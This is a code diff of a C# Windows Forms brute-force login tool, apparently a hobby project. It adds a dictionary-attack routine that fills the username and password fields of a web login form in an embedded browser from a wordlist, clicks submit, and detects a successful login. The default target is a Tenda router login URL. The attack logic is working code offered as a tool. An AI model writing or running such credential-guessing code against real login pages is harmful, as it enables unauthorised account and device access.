@@ -25,18 +25,19 @@ namespace BruteForceAttack
         public Form1()
         {
             InitializeComponent();
-      
+
             textBoxPostUrl.Text = "http://tendawifi.com/login/Auth"; // for testing purposes 
             webBrowser.Navigate(textBoxUrl.Text);
 
             ScintillaConfig.loadHtmlStyleConfig(scintillaDocumentTextBox);
             scintillaDocumentTextBox.Text = webBrowser.DocumentText;
 
-           // Highlighter.highlightHTMLText(richTextBoxDocumentText);
+            // Highlighter.highlightHTMLText(richTextBoxDocumentText);
 
             comboBoxEncode.SelectedIndex = 0;
             comboBoxEncodeTypeDictionary.SelectedIndex = 0;
             comboBoxStopConditions.SelectedIndex = 0;
+            comboBoxStopConditionsID.SelectedIndex = 0;
 
             updateIDs("//input", listBoxInputID);
             updateIDs("//button", listBoxButtonID);
@@ -184,7 +185,13 @@ namespace BruteForceAttack
                 textBoxRequestedUrl.Visible = false;
         }
 
-        private void buttonLoadFromFile_Click(object sender, EventArgs e, Button button)
+        //    private void buttonLoadFromFile_Click(object sender, EventArgs e, Button button)
+        private void buttonLoadFromFile_Click(object sender, EventArgs e)
+        {
+            loadFromFile(buttonStart);
+        }
+
+        private void loadFromFile(Button button)
         {
             openFileDialog.InitialDirectory = "c:\\";
             openFileDialog.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
@@ -298,6 +305,11 @@ namespace BruteForceAttack
             }
 
             //save log to file
+            showSaveLogMessage();
+        }
+
+        private void showSaveLogMessage()
+        {
             DialogResult dialogResult = MessageBox.Show("Do you want to save the log to a file?",
                 "Save log to file", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
             if (dialogResult == DialogResult.Yes)
@@ -317,7 +329,6 @@ namespace BruteForceAttack
                 }
             }
         }
-
 
 
         private LinkedList<Credential> encodeCredentials()
@@ -485,7 +496,7 @@ namespace BruteForceAttack
             {
                 Console.WriteLine(exception.ToString());
             }
-            
+
         }
 
         private void buttonSingleIDAttack_Click(object sender, EventArgs e)
@@ -504,7 +515,7 @@ namespace BruteForceAttack
                 }
                 catch (Exception exception)
                 {
-                    MessageBox.Show("Wrong Login ID.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+
                     Console.WriteLine(exception.ToString());
                 }
             }
@@ -526,14 +537,14 @@ namespace BruteForceAttack
             {
                 submit = webBrowser.Document.GetElementById(textBoxButtonID.Text);
                 submit.InvokeMember("click");
-                
+
                 //log
                 richTextBoxLog.AppendText(getTime() + " -! Performing Logging in using ID !-\r\n");
                 richTextBoxLog.AppendText("\tLogin id = " + textBoxLoginID.Text + Environment.NewLine);
                 richTextBoxLog.AppendText("\tLogin = " + textBoxLogin_SIdA.Text + Environment.NewLine);
                 richTextBoxLog.AppendText("\tPassword id = " + textBoxPasswordID.Text + Environment.NewLine);
                 richTextBoxLog.AppendText("\tPassword = " + textBoxPassword_SIdA.Text + Environment.NewLine);
-                richTextBoxLog.AppendText("\tButton id = " + textBoxButtonID.Text + new string('\n',2));
+                richTextBoxLog.AppendText("\tButton id = " + textBoxButtonID.Text + new string('\n', 2));
             }
             catch (Exception exception)
             {
@@ -541,7 +552,7 @@ namespace BruteForceAttack
                 Console.WriteLine(exception.ToString());
             }
 
-            
+
 
             //      Logical stucture
             // login = webBrowser.Document.GetElementById(textBoxLoginID.Text);
@@ -560,7 +571,111 @@ namespace BruteForceAttack
                 buttonSingleIDAttack.Enabled = false;
         }
 
-    
+        private async void buttonStartIdAttack_Click(object sender, EventArgs e)
+        {
+            HtmlElement password = null;
+            HtmlElement login = null;
+            HtmlElement submit = null;
+            bool isSuccess = false;
+            string documentTextStartPage = webBrowser.DocumentText;
+            string startUrl = webBrowser.Url.ToString();
+
+            //start log
+            richTextBoxLog.AppendText(getTime() + " -! Performing Logging in using ID !-\r\n");
+            richTextBoxLog.AppendText("\tLogin id = " + textBoxLoginIdDictionary.Text + Environment.NewLine);
+            richTextBoxLog.AppendText("\tPassword id = " + textBoxPasswordIdDictionary.Text + Environment.NewLine);
+            richTextBoxLog.AppendText("\tButton id = " + textBoxButtonIdDictionary.Text + new string('\n', 2));
+
+            foreach (var credential in credentials.ListOfCredentials)
+            {
+                // attack with login
+                if (!checkBoxPasswordsOnly.Checked)
+                {
+                    try
+                    {
+                        login = webBrowser.Document.GetElementById(textBoxLoginIdDictionary.Text);
+                        login.SetAttribute("value", credential.Login);
+                    }
+                    catch (Exception exception)
+                    {
+                        MessageBox.Show("Wrong Login ID.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        Console.WriteLine(exception.ToString());
+                    }
+                }
+
+                //set password
+                try
+                {
+                    password = webBrowser.Document.GetElementById(textBoxPasswordIdDictionary.Text);
+                    password.SetAttribute("value", credential.Password);
+                }
+                catch (Exception exception)
+                {
+                    MessageBox.Show("Wrong Password ID.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    Console.WriteLine(exception.ToString());
+                }
+
+                //invoke button click
+                try
+                {
+                    submit = webBrowser.Document.GetElementById(textBoxButtonIdDictionary.Text);
+                    submit.InvokeMember("click");
+
+                    //log
+                    richTextBoxLog.AppendText(getTime() + " Signing in using credential: "
+                                                        + credential.Login + ':' + credential.Password +
+                                                        Environment.NewLine);
+                }
+                catch (Exception exception)
+                {
+                    MessageBox.Show("Wrong Button ID.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    Console.WriteLine(exception.ToString());
+                }
+
+                //wait for response from webbrowser
+                try
+                {
+                    await PageLoad(1000, int.Parse(textBoxDelayID.Text));
+                }
+                catch (Exception exception)
+                {
+                    MessageBox.Show(exception.Message);
+                }
+
+                //execute stop conditions - dictionary attack success
+                if (isStopCondition(comboBoxStopConditionsID.SelectedIndex, documentTextStartPage,
+                    textBoxRequestedUrlID.Text, startUrl, webBrowser))
+                {
+                    isSuccess = true;
+                    string successLog = "Login success for credential " + credential.Login + ":" + credential.Password;
+                    richTextBoxLog.AppendText("\r\n" + getTime() + " -! " + successLog + " !-\r\n");
+                    MessageBox.Show(successLog, "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    break;
+                }
+            }
+
+            if (!isSuccess)
+            {
+                string fail = "Dictionary attack failed";
+                richTextBoxLog.AppendText("\r\n" + getTime() + " -! " + fail + " !-\r\n");
+                MessageBox.Show(fail + '.', "Fail!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+
+            //save log
+            showSaveLogMessage();
+        }
+
+        private void buttonLoadDictionaryID_Click(object sender, EventArgs e)
+        {
+            loadFromFile(buttonStartIdAttack);
+        }
+
+        private void comboBoxStopConditionsID_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (comboBoxStopConditionsID.SelectedIndex == 1)
+                textBoxRequestedUrlID.Visible = true;
+            else
+                textBoxRequestedUrlID.Visible = false;
+        }
     }
 }
-
